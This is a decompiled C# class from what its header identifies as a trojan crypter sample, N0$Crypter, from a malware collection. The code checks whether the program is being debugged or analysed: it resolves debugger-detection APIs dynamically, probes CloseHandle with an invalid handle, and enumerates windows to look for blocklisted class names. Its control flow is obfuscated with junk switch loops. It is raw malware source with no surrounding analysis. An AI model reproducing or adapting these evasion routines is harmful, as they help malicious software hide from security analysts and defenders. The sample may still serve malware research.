// Decompiled with JetBrains decompiler
// Type: A.CC
// Assembly: N0$Crypter, Version=3.0.7.1, Culture=neutral, PublicKeyToken=null
// MVID: FD276B3A-BCAA-4176-AE7A-13B114112E73
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Trojan.MSIL.Crypt.hae-91602cc2011b8768f677252d0fce055cd9e20323cd9c86736de5f27b67249290.exe

using System;
using System.Runtime.InteropServices;
using System.Text;

namespace A
{
  internal sealed class CC
  {
    internal const uint A = 1024;
    internal const uint B = 64;
    internal const int A = 0;
    private static bool A;

    [DllImport("kernel32.dll", EntryPoint = "SetLastError")]
    internal static extern void A(uint _param0);

    [DllImport("kernel32.dll", EntryPoint = "CloseHandle")]
    internal static extern int A(IntPtr _param0);

    [DllImport("kernel32.dll", EntryPoint = "OpenProcess")]
    internal static extern IntPtr B(uint _param0, int _param1, uint _param2);

    [DllImport("kernel32.dll", EntryPoint = "GetCurrentProcessId")]
    internal static extern uint A();

    [DllImport("kernel32.dll", EntryPoint = "LoadLibrary", CharSet = CharSet.Auto, SetLastError = true)]
    internal static extern IntPtr A(string _param0);

    [DllImport("kernel32.dll", EntryPoint = "GetProcAddress", CharSet = CharSet.Ansi)]
    internal static extern CC.VB A(IntPtr _param0, string _param1);

    [DllImport("kernel32.dll", EntryPoint = "GetProcAddress", CharSet = CharSet.Ansi)]
    internal static extern CC.WB A(IntPtr _param0, string _param1);

    [DllImport("kernel32.dll", EntryPoint = "GetProcAddress", CharSet = CharSet.Ansi)]
    internal static extern CC.ZB A(IntPtr _param0, string _param1);

    [DllImport("kernel32.dll", EntryPoint = "GetProcAddress", CharSet = CharSet.Ansi)]
    internal static extern CC.XB A(IntPtr _param0, string _param1);

    [DllImport("kernel32.dll", EntryPoint = "GetProcAddress", CharSet = CharSet.Ansi)]
    internal static extern CC.YB A(IntPtr _param0, string _param1);

    [DllImport("kernel32.dll", EntryPoint = "GetProcAddress", CharSet = CharSet.Ansi)]
    internal static extern CC.BC A(IntPtr _param0, string _param1);

    private static int A(IntPtr _param0, IntPtr _param1)
    {
      string[] strArray = new string[1]{ EC.A(14676) };
      string str1 = CC.B(_param0);
      foreach (string str2 in strArray)
      {
        if (UCB.A(str1, str2, true) == 0)
        {
label_2:
          switch (1)
          {
            case 0:
              goto label_2;
            default:
              if (false)
              {
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (CC.A);
              }
              CC.A = true;
              return 0;
          }
        }
      }
label_8:
      switch (6)
      {
        case 0:
          goto label_8;
        default:
          return 1;
      }
    }

    [DllImport("user32.dll", EntryPoint = "GetClassName", CharSet = CharSet.Auto)]
    internal static extern int A(IntPtr _param0, StringBuilder _param1, int _param2);

    internal static string B(IntPtr _param0)
    {
      StringBuilder stringBuilder = HH.A(260);
      CC.A(_param0, stringBuilder, GH.A((object) stringBuilder));
      return RD.B((object) stringBuilder);
    }

    internal static void A()
    {
      if (!CC.A())
        return;
label_1:
      switch (3)
      {
        case 0:
          goto label_1;
        default:
          if (false)
          {
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (CC.A);
          }
          throw PW.A(EC.A(14691));
      }
    }

    internal static bool A()
    {
      try
      {
        if (HQ.A())
        {
label_1:
          switch (3)
          {
            case 0:
              goto label_1;
            default:
              if (false)
              {
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (CC.A);
              }
              return true;
          }
        }
        else
        {
          IntPtr num1 = CC.A(EC.A(14847));
          CC.XB xb = CC.A(num1, EC.A(14872));
          if (xb != null)
          {
label_6:
            switch (7)
            {
              case 0:
                goto label_6;
              default:
                if (YCB.A((object) xb) != 0)
                {
label_8:
                  switch (1)
                  {
                    case 0:
                      goto label_8;
                    default:
                      return true;
                  }
                }
                else
                  break;
            }
          }
          IntPtr num2 = CC.B(1024U, 0, CC.A());
          if (XCB.A(num2, IntPtr.Zero))
          {
label_11:
            switch (1)
            {
              case 0:
                goto label_11;
              default:
                try
                {
                  CC.ZB zb = CC.A(num1, EC.A(14907));
                  if (zb != null)
                  {
label_13:
                    switch (1)
                    {
                      case 0:
                        goto label_13;
                      default:
                        int num3 = 0;
                        if (WCB.A((object) zb, num2, ref num3) != 0)
                        {
label_15:
                          switch (6)
                          {
                            case 0:
                              goto label_15;
                            default:
                              if (num3 != 0)
                              {
label_17:
                                switch (7)
                                {
                                  case 0:
                                    goto label_17;
                                  default:
                                    return true;
                                }
                              }
                              else
                                break;
                          }
                        }
                        else
                          break;
                        break;
                    }
                  }
                  else
                    break;
                }
                finally
                {
                  CC.A(num2);
                }
                break;
            }
          }
          bool flag = false;
          try
          {
            CC.A(new IntPtr(305419896));
          }
          catch
          {
            flag = true;
          }
          if (flag)
          {
label_24:
            switch (4)
            {
              case 0:
                goto label_24;
              default:
                return true;
            }
          }
          else
          {
            try
            {
              CC.BC bc = CC.A(CC.A(EC.A(14960)), EC.A(14981));
              if (bc != null)
              {
label_27:
                switch (7)
                {
                  case 0:
                    goto label_27;
                  default:
                    CC.A = false;
                    VCB.A((object) bc, new CC.AC(CC.A), IntPtr.Zero);
                    if (CC.A)
                    {
label_29:
                      switch (6)
                      {
                        case 0:
                          goto label_29;
                        default:
                          return true;
                      }
                    }
                    else
                      break;
                }
              }
            }
            catch
            {
            }
          }
        }
      }
      catch
      {
      }
      return false;
    }

    [StructLayout(LayoutKind.Sequential)]
    internal sealed class UB
    {
      internal IntPtr A;
      internal IntPtr B;
      internal IntPtr C;
      internal IntPtr D;
      internal IntPtr E;
      internal IntPtr F;
    }

    internal delegate int VB(
      IntPtr ProcessHandle,
      int ProcessInformationClass,
      CC.UB ProcessInformation,
      uint ProcessInformationLength,
      out uint ReturnLength);

    internal delegate int WB(
      IntPtr ProcessHandle,
      int ProcessInformationClass,
      out uint debugPort,
      uint ProcessInformationLength,
      out uint ReturnLength);

    internal delegate int XB();

    internal delegate void YB([MarshalAs(UnmanagedType.LPStr)] string lpOutputString);

    internal delegate int ZB(IntPtr hProcess, ref int pbDebuggerPresent);

    internal delegate int AC(IntPtr wnd, IntPtr lParam);

    internal delegate int BC(CC.AC lpEnumFunc, IntPtr lParam);
  }
}
